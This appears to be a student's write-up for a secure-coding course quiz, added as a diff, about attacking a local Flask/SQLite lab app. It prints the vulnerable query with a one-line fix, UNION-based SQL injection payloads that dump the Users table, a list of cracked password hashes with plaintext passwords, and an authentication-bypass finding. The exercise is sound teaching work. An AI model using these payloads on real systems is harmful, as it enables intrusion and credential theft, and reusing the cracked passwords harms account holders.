@@ -1,0 +1,78 @@
+Quiz 1: Secure Coding
+Professor: Dr. Neel
+Creator: John Shrein
+Student: Robert Edstrom (pr0n1s)
+================================
+<(' '>) <(' ')> (>' ')> <(' ')>
+================================
+
+Nmap
+====
+pr0n1s@pr0n1s:~/Downloads$ nmap -sV localhost -p 5000
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2018-02-15 02:20 CST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000088s latency).
+PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.4)
+
+Vulnerable to SQL Injection:
+============================
+curs = g.db.execute("SELECT quiz_name FROM Quizzes WHERE quiz_name LIKE '%%%s%%'" %item)
+
+	Fix:
+	====
+		Parameterize user input
+
+Database:
+=========
+	SQLite3
+
+	Proof
+	=====
+		sqlite3.Warning: You can only execute one statement at a time
+
+Framework:
+==========
+	Flask
+
+	Proof:
+	======
+		main.py:14: FlaskWTFDeprecationWarning: "flask_wtf.Form" has been renamed to "FlaskForm" and will be removed in 1.0.
+
+[*] Get Creds [*]
+=================
+
+Table Names:
+============
+q' UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+
+Users Table Schema:
+===================
+q' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='Users'--
+
+Usernames and Passwords:
+========================
+q' UNION SELECT username || password FROM Users--
+
+Cracked Passwords (10):
+=======================
+brknleg						 819c0ee30c8f8d9e076ff13573b308839b0f6554d0b3ede2170253e3b0b27d39:102:jo30brotherS16
+dmtman						 4dcedacaea5859a4ec3c92dc33dd1450b38a0a099e9555a3a8ecbb5776de9f81:123:terrypollykaicer
+ezekiel2517				 a0a7cdb46844a7a61b0905527cc77683fe06fdd0074975474641019218cc2319:240
+floyd							 33b1731da2a1c9fe6de3a08228e1236d5daea25db3f8a7b90e5d00f7ce5bf0d7:143:arunajaiswal111
+goreswell					 7bf291424921dae56da906b65737bff97715824b21e82a4ea6cd41375245cedc:28:cortolvin191185
+grndnpnd					 3154b3ae9ed23d7bcd06c342ad95211fad2d457c80bd26b7be1767ac8babb98f:20:mewmew12
+kneecaps					 9e088b2b686dc9b7cfc23629ccc971c3661a6e5e156ac29b780b68712a7b572e:72:azieziualuiadytza
+mako							 e102f3a10201611662b84ea17b56f26adc4ad92afa5174bf718f3221f4432207:6:tvxq0836748964
+nightcreature			 7e736333ba133b4ba5b7ef2c1c4c071c0074dd3f9738284bd4e3334ffbed6121:215:FloFiIsintheHOUS
+pcloadltr					 2a86e2dcd1b4aa66dcaf1ce77bd05521a96f2bd1b340cf9d1654f9808dbc0d18:25:Ss1603941901
+prblmslvr					 b09432cf4fa7d311612e47f9acd1eecf77ed5792d5b458aeabce104916f8ad8d:193
+revenge						 9c162ab5d3bd2fec11fe57ede1b1a099d9e87f73b144d56404c23ae859db3ebb:108
+royalewithcheese	 da51d43d9d654cd1c7bdb06e831fbbdd01731bc64c7e3c9f8d4c7f1e85234e79:96
+toolshed					 54afc913205dd4f42fba36e29660eed52c2ef24c56f3afc8984570e4d2f1c8c7:115
+wildcard					 b8c926955a6da51faae90de49eea553ff87450fbefad949066519ec0e18f7052:70:48980284123103
+
+We can login using one of the usernames:passwords provided above.
+Additionally, we can also login by simply putting http://localhost:5000/profile into the browser.
+It appears this server was misconfigured... Easy authentication bypass.
